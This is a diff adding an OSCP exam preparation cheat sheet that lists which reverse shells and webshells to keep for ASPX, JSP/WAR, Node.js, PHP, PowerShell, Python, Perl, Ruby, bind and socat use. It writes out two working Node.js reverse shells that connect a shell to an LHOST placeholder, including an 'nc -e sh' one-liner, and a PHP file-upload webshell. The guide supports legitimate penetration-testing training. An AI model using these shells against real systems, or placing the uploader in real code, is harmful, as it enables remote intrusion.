@@ -1,0 +1,184 @@
+######################################################################
+# SHELL TYPES FOR OSCP USE (NO METERPRETER)
+######################################################################
+
+This file explains which shell formats you should keep locally and 
+what each one is used for.
+
+======================================================================
+# 1. ASPX Shells (For IIS / Windows Web Servers)
+======================================================================
+
+ASPX shells are used when exploiting Windows servers that run IIS.
+Typically useful when:
+
+- You gain file upload to an IIS directory
+- You exploit an ASPX-based web application
+- You need code execution via Windows web contexts
+
+Recommended to store:
+- cmd.aspx (PentestMonkey ASPX command shell)
+- aspx_rev_shell.aspx (simple TCP reverse shell)
+- aspx_uploader.aspx (upload manager if allowed → careful)
+
+Why needed:
+- Many OSCP-style Windows machines expose IIS + file upload.
+
+======================================================================
+# 2. JSP & WAR Shells (For Tomcat / Java Web Servers)
+======================================================================
+
+JSP or WAR shells are used when:
+- You have access to Tomcat Manager upload
+- You exploit a Java-based web app
+- You hijack a deployable .war file
+
+Store:
+- cmd.jsp (PentestMonkey JSP shell)
+- reverse.jsp (basic reverse TCP shell)
+- shell.war (package containing JSP shell)
+
+Why needed:
+- Tomcat Manager exploitation is common in OSCP-like HTB boxes.
+- WAR shells give instant RCE when deployed.
+
+======================================================================
+# 3. Node.js Reverse Shells (For Node-based RCE)
+======================================================================
+
+Node shells are used when:
+- You exploit SSTI in Node
+- You get RCE in a Node express app
+- You need JS-based reverse shell
+
+Two common NodeJS shell formats:
+
+1) Simple exec() shell (works if "nc" exists):
+------------------------------------------------
+require('child_process').exec('nc -e sh LHOST LPORT');
+
+2) Full interactive Node reverse shell:
+------------------------------------------------
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("sh", []);
+    var client = new net.Socket();
+    client.connect(LPORT, "LHOST", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+})();
+------------------------------------------------
+
+When to use:
+- SSTI (e.g., mustache, handlebars, pug)
+- eval-based injection in Node apps
+
+======================================================================
+# 4. PHP Shells
+======================================================================
+
+Keep:
+- pentestmonkey php_reverse_shell.php
+- ivan-sincek php-reverse-shell.php
+- php upload shell (simple uploader)
+
+Example uploader:
+-----------------------------
+<?php
+if(isset($_FILES['file'])){
+    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+}
+?>
+-----------------------------
+
+Why useful:
+- Uploading webshell + uploading exploit files
+- Very common in OSCP-Web boxes
+
+======================================================================
+# 5. PowerShell Reverse Shells (Windows)
+======================================================================
+
+Store these locally because they work reliably in OSCP:
+
+1) Full TCP Reverse Shell (most stable)
+---------------------------------------
+[PowerShell TCP reverse shell script]
+
+2) PowerShell over TLS (stealthy, works when ports are restricted)
+---------------------------------------
+[PowerShell TLS reverse shell script]
+
+3) PowerShell Base64 encoded payload
+---------------------------------------
+Used to bypass special characters or filtering.
+
+Why needed:
+- For Windows privesc or during web exploitation
+- When only powershell.exe is available
+- Bypasses restrictive commands
+
+======================================================================
+# 6. Python Reverse Shells (OSCP Essential)
+======================================================================
+
+Why used:
+- Python3 is installed on 80%+ of OSCP/Linux boxes.
+- Gives stable TTY with pty.spawn.
+
+Store:
+- python3_pty_shell.py
+- python3_one_liner_shell.txt
+
+======================================================================
+# 7. Perl & Ruby Reverse Shells
+======================================================================
+
+Use when:
+- You find Perl/Ruby installed
+- Other shell methods fail
+
+Store:
+- perl_rev_shell.pl
+- ruby_rev_shell.rb
+
+======================================================================
+# 8. Bind Shells (When reverse is impossible)
+======================================================================
+
+Use bind shells when:
+- Target cannot reach your machine (firewall outbound blocked)
+- But you can reach the target
+
+Store:
+- nc_bind_shell.sh
+
+======================================================================
+# 9. Socat Full-TTY Shells (Strongly recommended)
+======================================================================
+
+You should store:
+- socat_reverse_shell.txt
+- socat_full_tty.txt
+
+Why:
+- Best shell for binary exploitation
+- Stable interactive TTY
+
+======================================================================
+# WHAT NOT TO STORE (OSCP DOES NOT ALLOW)
+======================================================================
+
+❌ meterpreter payloads  
+❌ msfvenom windows/meterpreter shells  
+❌ staged/stageless meterpreter  
+❌ multi/handler  
+❌ encoded msfvenom payloads  
+❌ payloads requiring Metasploit Framework  
+
+######################################################################
+# END
+######################################################################
